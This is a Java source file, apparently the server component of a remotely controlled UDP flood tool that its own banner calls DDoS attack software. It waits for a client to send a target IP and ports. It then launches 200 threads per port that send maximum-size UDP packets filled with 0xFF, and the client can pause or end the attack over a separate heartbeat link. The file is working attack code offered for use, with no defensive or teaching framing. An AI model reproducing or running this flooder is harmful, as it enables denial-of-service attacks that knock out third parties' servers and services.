package com.mycompany.udpsender;

import java.io.BufferedReader;
import java.util.ArrayList;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.DatagramPacket;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;

/**
 * Clase gestora de los procesos de ataque y comunicación del lado del servidor.
 * @author ElMendaXD
 */
public class UDPSender {
    
    private static int PUERTOS[] = new int[2];
    private static int PUERTO_MENSAJES;
    private static int PUERTO_HEARTBEAT;
    private static final long PING_INTERVAL = 10000; // 10 segundos
    private static final long TIMEOUT = PING_INTERVAL * 6; // 60 segundos
    
    private static Socket clientSocket;
    private static Socket heartbeatClientSocket;
    private static PrintWriter messageOut;
    private static BufferedReader messageIn;
    private static PrintWriter heartbeatOut;
    private static BufferedReader heartbeatIn;
    private static long lastPingTime;
    private static String estado;
    @SuppressWarnings("FieldMayBeFinal")
    private static ArrayList<Sender> sendersEnBlanco = new ArrayList<>();;
    private static ArrayList<Sender> sendersEnUso = new ArrayList<>();;
    private static ArrayList<Thread> threads = new ArrayList<>();;
    private static Target target;

    /**
     * Clase main del programa de ataque del lado del servidor.
     * @param args
     * @throws IOException
     */
    @SuppressWarnings({"null", "SleepWhileInLoop", "UnusedAssignment"})
    public static void main(String[] args) throws IOException {
        
        try {
            System.setOut(new PrintStream(System.out, true, StandardCharsets.UTF_8.name()));
        } catch (UnsupportedEncodingException e) {}
        
        System.out.println("Gracias por usar el software de ataque DDoS mediante overflow de paquetes UDP de ElMendaXD.");
        int puertosTemp[] = MyInput.deserialize("configSV.bin");
        
        
        if (puertosTemp != null){
            PUERTOS = puertosTemp;
            PUERTO_MENSAJES = PUERTOS[0];
            PUERTO_HEARTBEAT = PUERTOS[1];
            System.out.print("Se ha detectado una configuración previa. ¿Desea usar el puerto " + PUERTO_MENSAJES + " para la comunicación y el puerto " + PUERTO_HEARTBEAT + " para el heartbeat? (S/N): ");
            String respuesta = MyInput.readString();
        
            boolean siguiente;
            do {
                switch (respuesta) {
                    case "S", "s" -> {
                        siguiente = true;
                    }
                    case "N", "n" -> {
                        System.out.println("");
                        System.out.println("");
                        System.out.println("Configuración de puertos (asegurese de poner puertos validos y disponibles).");
                        System.out.print("Puerto de mensajes: ");
                        PUERTO_MENSAJES = MyInput.readInt();
                        System.out.print("Puerto de heartbeat: ");
                        PUERTO_HEARTBEAT = MyInput.readInt();
                        PUERTOS[0] = PUERTO_MENSAJES;
                        PUERTOS[1] = PUERTO_HEARTBEAT;
                        MyInput.serialize(PUERTOS, "configSV.bin");
                        siguiente = true;
                    }
                    default -> {
                        siguiente = false;
                        System.out.println("Respuesta no valida, introduzca un valor valido");
                        System.out.print("¿Desea usar el puerto " + PUERTO_MENSAJES + " para la comunicación y el puerto " + PUERTO_HEARTBEAT + " para el heartbeat? (S/N): ");
                        respuesta = MyInput.readString();
                    }
                }
            } while (!siguiente);
        } else {
            System.out.println("");
            System.out.println("");
            System.out.println("Configuración de puertos (asegurese de poner puertos validos y disponibles).");
            System.out.print("Puerto de mensajes: ");
            PUERTO_MENSAJES = MyInput.readInt();
            System.out.print("Puerto de heartbeat: ");
            PUERTO_HEARTBEAT = MyInput.readInt();
            PUERTOS[0] = PUERTO_MENSAJES;
            PUERTOS[1] = PUERTO_HEARTBEAT;
            MyInput.serialize(PUERTOS, "configSV.bin");
        }

        System.out.println("");
        System.out.println("");
        System.out.println("");
        System.out.println("");
        System.out.println("Servidor disponible para ser usado por el cliente.");
        System.out.println("");

        
        
        estado = "Listo";
        
        // Hilo para manejar el servidor de heartbeat
        new Thread(() -> {
            while (!estado.equals("Finalizado")) {
                try (ServerSocket heartbeatSocket = new ServerSocket(PUERTO_HEARTBEAT)) {
                    System.out.println("Servidor de heartbeat escuchando en el puerto " + PUERTO_HEARTBEAT + ".");

                    heartbeatClientSocket = heartbeatSocket.accept();
                    System.out.println("Cliente conectado para heartbeat.");

                    heartbeatIn = new BufferedReader(new InputStreamReader(heartbeatClientSocket.getInputStream()));
                    heartbeatOut = new PrintWriter(heartbeatClientSocket.getOutputStream(), true);

                    lastPingTime = System.currentTimeMillis();

                    // Hilo para enviar pings periódicos
                    new Thread(() -> {
                        try {
                            while (!heartbeatClientSocket.isClosed()) {
                                Thread.sleep(PING_INTERVAL);
                                if (System.currentTimeMillis() - lastPingTime > TIMEOUT) {
                                    clientSocket.close(); // Cerrar el socket si el cliente no responde
                                    heartbeatClientSocket.close();
                                    return; // Terminar el hilo de heartbeat
                                }
                                if(estado.equals("Finalizado")){
                                    clientSocket.close();
                                    heartbeatClientSocket.close();
                                }
                                heartbeatOut.println("PING");
                            }
                        } catch (IOException | InterruptedException e) {
                            
                        }
                    }).start();

                    String mensaje;
                    while ((mensaje = heartbeatIn.readLine()) != null) {
                        if ("PONG".equals(mensaje)) {
                            lastPingTime = System.currentTimeMillis();
                        }
                    }
                } catch (Exception e) {
                }
            }
        }).start();
        
        while (!estado.equals("Finalizado")) {
            try (ServerSocket serverSocket = new ServerSocket(PUERTO_MENSAJES)) {
                System.out.println("Servidor de mensajes escuchando en el puerto " + PUERTO_MENSAJES + ".");
                System.out.println("Esperando la conexión con el cliente.");

                clientSocket = serverSocket.accept();
                System.out.println("Cliente conectado para mensajes.");
                System.out.println("En caso de desconexión con el cliente, el programa continuara su ejecución actual hasta que el cliente se reconecte y se reciban ordenes nuevas.");
                
                messageIn = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                messageOut = new PrintWriter(clientSocket.getOutputStream(), true);
                // Enviar el estado inicial del programa
                messageOut.println(estado);

                // Manejar los mensajes en el hilo principal
                String mensaje;
                while (!estado.equals("Finalizado")) {
                    mensaje = messageIn.readLine();
                    switch (mensaje) {
                        case "Update" -> {
                            messageOut.println(estado);
                        }
                        case "Pausar" -> {
                            // Pausar todos los hilos
                            System.out.println("Pausando hilos...");
                            for (Sender sender : sendersEnUso) {
                                sender.requestStop();
                            }
                            sendersEnUso.clear();
                            threads.clear();
                            System.out.println("Ejecución parada por orden del cliente.");
                            estado = "En espera";
                            mensaje = null;
                        }
                        case "Finalizar" -> {
                            sendersEnBlanco.clear();
                            clientSocket.close();
                            heartbeatClientSocket.close();
                            System.out.println("Programa finalizado por orden del cliente.");
                            System.out.println("Gracias por usar el software de ataque DDoS mediante overflow de paquetes UDP de ElMendaXD.");
                            estado = "Finalizado";
                            mensaje = null;
                        }
                        default -> {
                            if (mensaje != null) {
                                stringToTarget(mensaje);
                                indexador();
                                sendersEnUso = new ArrayList<>();
                                threads = new ArrayList<>();

                                for (Sender sender : sendersEnBlanco) {
                                    sendersEnUso.add(sender);
                                }

                                for (Sender sender : sendersEnUso) {
                                    threads.add(new Thread(sender));
                                }
                                // Iniciar todos los hilos
                                System.out.println("Inicializando hilos...");
                                for (Thread thread : threads) {
                                    thread.start();
                                }
                                System.out.println("Ejecución iniciada por orden del cliente.");
                                estado = "En ejecución";
                                mensaje = null;
                            }
                        }
                    }
                }
            } catch (Exception e) {
            }
        }
    }
    
    /**
     * Metodo encargado de la generación de los datagramas de ataque.
     * @throws UnknownHostException
     * @throws SocketException
     */
    @SuppressWarnings("null")
    public static void indexador() throws UnknownHostException, SocketException{
        // Crea el mensaje a enviar
        byte[] paquete = new byte[65507];
        for (int i = 0; i < paquete.length; i++) {
            paquete[i] = (byte) 255;
        }

        ArrayList<DatagramPacket> datagramPackets = new ArrayList<>();
        // Crea un paquete UDP con el paquete
        for (int i = 0; i < Target.puertosAtaque.size(); i++){
            datagramPackets.add(new DatagramPacket(paquete, paquete.length, InetAddress.getByName(Target.IP), Target.puertosAtaque.get(i)));
        }
        sendersEnBlanco.clear();
        for (DatagramPacket datagram : datagramPackets) {
            for (int n = 0; n<200; n++) {
                Sender sender = new Sender(datagram);
                sendersEnBlanco.add(sender);
            }
        }
    }
    
    /**
     * Convierte una cadena en formato String a un objeto Target.
     * @param str La cadena que representa el objeto Target.
     */
    public static void stringToTarget(String str) {
        String[] parts = str.split("\\|");
        
        Target.IP = parts[0];
        
        Target.puertosAtaque.clear();
        
        // Procesar puertosAtaque
        String[] portStrings = parts[1].split(",");
        for (String portStr : portStrings) {
            if (!portStr.isEmpty()) {
                try {
                    Target.puertosAtaque.add(Integer.valueOf(portStr));
                } catch (NumberFormatException e) {}
            }
        }
    }
}